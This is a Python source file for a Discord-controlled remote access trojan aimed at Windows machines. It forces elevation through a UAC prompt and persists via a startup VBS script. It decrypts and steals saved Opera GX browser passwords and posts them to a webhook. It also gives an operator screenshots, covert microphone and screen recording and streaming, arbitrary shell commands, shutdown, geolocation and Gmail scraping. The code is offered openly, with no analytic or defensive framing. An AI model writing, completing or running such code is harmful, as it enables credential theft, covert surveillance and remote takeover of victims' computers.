import discord
import os
import sqlite3
import shutil
import json
import base64
import requests
from getpass import getuser
from Crypto.Cipher import AES
import subprocess
import sounddevice as sd
import numpy as np
import wave
from mss import mss
import cv2
import time
import atexit
import sys
import asyncio
import socket
from discord.ui import Button, View
import nacl
import pickle
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build

# ======== ADMIN ELEVATION ========
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Re-run the script with admin rights
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

TOKEN = ""

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.voice_states = True

bot = discord.Client(intents=intents)

active_rooms = {}
voice_clients = {}
stream_controls = {}
SAMPLE_RATE = 48000
CHUNK_SIZE = 960

class AudioStreamer(discord.AudioSource):
    def __init__(self):
        self.queue = asyncio.Queue()
        self.stream = sd.InputStream(
            samplerate=SAMPLE_RATE,
            channels=2,
            dtype='int16',
            blocksize=CHUNK_SIZE,
            callback=self.audio_callback
        )
        self.stream.start()

    def audio_callback(self, indata, frames, time, status):
        self.queue.put_nowait(indata.copy())

    def read(self):
        try:
            audio_data = self.queue.get_nowait().tobytes()
        except asyncio.QueueEmpty:
            return b'\x00' * CHUNK_SIZE * 2 * 2
        return audio_data

    def cleanup(self):
        self.stream.stop()
        self.stream.close()

def path_fetcher():
    add_to_startup10()
    opera_data_dir = f"C:/Users/{getuser()}/AppData/Roaming/Opera Software/Opera GX Stable"
    login_data_src = os.path.join(opera_data_dir, "Login Data")
    
    if not os.path.exists(login_data_src):
        print("Login Data file not found.")
        return None
    
    temp_db = os.path.join(os.getcwd(), "temp_login_data.db")
    shutil.copyfile(login_data_src, temp_db)
    return temp_db

def get_encryption_key():
    local_state_path = f"C:/Users/{getuser()}/AppData/Roaming/Opera Software/Opera GX Stable/Local State"
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        import win32crypt
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Failed to get encryption key: {e}")
        return None

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode("utf-8")
        return decrypted_pass
    except Exception as e:
        print(f"Decryption failed: {e}")
        return ""

def data_fetcher():
    path = path_fetcher()
    if path is None:
        return []
    
    data = []
    connection = None
    try:
        connection = sqlite3.connect(path)
        connection.text_factory = lambda x: x.decode("utf-8", errors="ignore")
        query = connection.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = query.fetchall()
    except sqlite3.OperationalError as e:
        print(f"Database error: {e}")
    finally:
        if connection:
            connection.close()
        if os.path.exists(path):
            os.remove(path)
    return data

def send_to_webhook(file_path, webhook_url):
    try:
        with open(file_path, "rb") as f:
            files = {"file": f}
            response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print("File successfully sent to webhook.")
        else:
            print(f"Failed to send file to webhook. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending file to webhook: {e}")

def main():
    key = get_encryption_key()
    if key is None:
        print("Failed to retrieve encryption key. Exiting.")
        return
    
    data = data_fetcher()
    txt_file_path = "credentials.txt"
    
    with open(txt_file_path, "w", encoding="utf-8") as f:
        for url, username, password_value in data:
            decrypted_password = decrypt_password(password_value, key)
            f.write("=======================\n")
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {decrypted_password}\n")
            f.write("=======================\n")
    
    webhook_url = ""
    send_to_webhook(txt_file_path, webhook_url)
    
    if os.path.exists(txt_file_path):
        os.remove(txt_file_path)
        print("Temporary .txt file deleted.")

def add_to_startup10():
    try:
        import win32com.client
        from win32com.client import Dispatch
        
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        
        vbs_script = f"""
        Set UAC = CreateObject("Shell.Application")
        UAC.ShellExecute "{sys.executable}", "{os.path.abspath(__file__)}", "", "runas", 1
        """
        
        vbs_path = os.path.join(startup_folder, "ElevatedStart.vbs")
        with open(vbs_path, "w") as f:
            f.write(vbs_script)
        
        print(f"⏫ Admin startup script created: {vbs_path}")
        return True
        
    except Exception as e:
        print(f"❌ Admin startup creation failed: {e}")
        return False

def get_system_info():
    return (
        os.environ.get("COMPUTERNAME", "UnknownPC"),
        socket.gethostbyname(socket.gethostname())
    )

async def manage_rooms(guild):
    computer_name, ip_address = get_system_info()
    room_name = f"{computer_name}-{ip_address}"
    
    existing_category = discord.utils.get(guild.categories, name=room_name)
    if existing_category:
        text_channel = discord.utils.get(existing_category.text_channels, name="control-panel") or \
            await existing_category.create_text_channel("control-panel")
        voice_channel = discord.utils.get(existing_category.voice_channels, name="voice-feed") or \
            await existing_category.create_voice_channel("voice-feed")
    else:
        category = await guild.create_category(room_name)
        text_channel = await category.create_text_channel("control-panel")
        voice_channel = await category.create_voice_channel("voice-feed")
    
    active_rooms[room_name] = {
        "category": existing_category or category,
        "text_channel": text_channel,
        "voice_channel": voice_channel
    }
    
    await text_channel.purge(limit=2)
    embed = discord.Embed(
        title=f"System Monitor: {room_name}",
        description="🟢 Session initialized",
        color=0x00ff00
    )
    await text_channel.send(embed=embed)

async def cleanup_resources(target_room):
    if target_room in voice_clients:
        vc = voice_clients[target_room]
        if vc.is_playing():
            vc.stop()
        await vc.disconnect()
        del voice_clients[target_room]
    
    if target_room in stream_controls:
        if 'audio' in stream_controls[target_room]:
            stream_controls[target_room]['audio'].cleanup()
        stream_controls.pop(target_room, None)

@bot.event
async def on_ready():
    print(f"Bot connected as {bot.user}")
    main()  # Execute main function for credential extraction
    for guild in bot.guilds:
        await manage_rooms(guild)

@bot.event
async def on_message(message):
    if message.author == bot.user or not message.content.startswith(";"):
        return

    target_room = next(
        (rn for rn, rd in active_rooms.items() 
         if message.channel == rd["text_channel"]),
        None
    )
    
    if not target_room:
        return

    try:
        parts = message.content[1:].split()
        command = parts[0].lower()
        
        if command == "screenshot":
            with mss() as sct:
                filename = f"screenshot_{target_room}.png"
                sct.shot(mon=1, output=filename)
                await message.channel.send(file=discord.File(filename))
            os.remove(filename)

        elif command == "recmic":
            duration = int(parts[1]) if len(parts) > 1 else 10
            filename = f"mic_{target_room}.wav"
            
            recording = sd.rec(
                int(duration * SAMPLE_RATE),
                samplerate=SAMPLE_RATE,
                channels=2,
                dtype='int16'
            )
            sd.wait()
            
            with wave.open(filename, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(SAMPLE_RATE)
                wf.writeframes(recording.tobytes())
            
            await message.channel.send(file=discord.File(filename))
            os.remove(filename)

        elif command == "recscreen":
            duration = int(parts[1]) if len(parts) > 1 else 10
            filename = f"screen_{target_room}.mp4"
            
            with mss() as sct:
                monitor = sct.monitors[1]
                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                out = cv2.VideoWriter(
                    filename, fourcc, 20.0, 
                    (monitor['width'], monitor['height'])
                )
                
                start = time.time()
                while (time.time() - start) < duration:
                    frame = np.array(sct.grab(monitor))
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                    out.write(frame)
                out.release()
            
            await message.channel.send(file=discord.File(filename))
            os.remove(filename)

        elif command == "cmd":
            result = subprocess.run(
                ' '.join(parts[1:]),
                shell=True,
                capture_output=True,
                text=True
            )
            output = result.stdout or result.stderr
            await message.channel.send(f"```\n{output[:1900]}\n```")

        elif command == "livemic":
            if target_room not in voice_clients:
                vc = await active_rooms[target_room]["voice_channel"].connect()
                voice_clients[target_room] = vc
                
                audio_source = AudioStreamer()
                stream_controls[target_room] = {'audio': audio_source}
                vc.play(audio_source)
                
                stop_btn = Button(label="Stop Mic", style=discord.ButtonStyle.red)
                view = View(timeout=None)
                view.add_item(stop_btn)

                async def stop_callback(interaction):
                    await cleanup_resources(target_room)
                    await interaction.response.send_message("🔇 Microphone stream stopped")

                stop_btn.callback = stop_callback
                await message.channel.send(
                    "🎤 Live microphone streaming started!",
                    view=view
                )

        elif command == "livescreen":
            stream_controls[target_room] = {'screen': True}
            
            stop_btn = Button(label="Stop Screen", style=discord.ButtonStyle.red)
            view = View(timeout=None)
            view.add_item(stop_btn)

            async def stop_callback(interaction):
                stream_controls[target_room]['screen'] = False
                await interaction.response.send_message("🖥️ Screen sharing stopped")

            stop_btn.callback = stop_callback
            msg = await message.channel.send(
                "🖥️ Starting live screen share...",
                view=view
            )

            while stream_controls.get(target_room, {}).get('screen', False):
                with mss() as sct:
                    filename = f"live_{target_room}.png"
                    sct.shot(mon=1, output=filename)
                    await msg.edit(content=f"Last update: {time.ctime()}")
                    await message.channel.send(file=discord.File(filename))
                    os.remove(filename)
                    await asyncio.sleep(5)

        elif command == "restart":
            await message.channel.send("🔄 System restart initiated...")
            os.system("shutdown /r /t 1")

        elif command == "shutdown":
            await message.channel.send("⏻ System shutdown initiated...")
            os.system("shutdown /s /t 1")

        elif command == "location":
            try:
                response = requests.get("https://ipinfo.io/json")
                data = response.json()
                loc_info = (
                    f"IP: {data['ip']}\n"
                    f"City: {data['city']}\n"
                    f"Region: {data['region']}\n"
                    f"Country: {data['country']}\n"
                    f"Location: {data['loc']}"
                )
                await message.channel.send(f"📍 Geolocation:\n```\n{loc_info}\n```")
            except Exception as e:
                await message.channel.send(f"❌ Location error: {str(e)}")

        elif command == "getmail":
            await message.channel.send("🔍 Digging through emails...")
            
            # Scrape emails using saved session
            email_data = await get_gmail_emails()
            if not email_data:
                await message.channel.send("❌ Failed to retrieve emails")
                return
                
            # Save to file
            filename = "INBOX.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(email_data)
                
            # Send to webhook
            webhook_url = ""
            send_to_webhook(filename, webhook_url)
            os.remove(filename)
            
            await message.channel.send("✅ All emails sent!")

    except Exception as error:
        await message.channel.send(f"⚠️ Command failed: {str(error)}")

if __name__ == "__main__":
    # Ensure the script runs as Administrator
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    
    # Add to Startup with admin privileges
    if add_to_startup10():
        print("🔒 Admin startup configured")
    else:
        print("❌ Failed to configure admin startup")
    
    # Run the bot
    bot.run(TOKEN)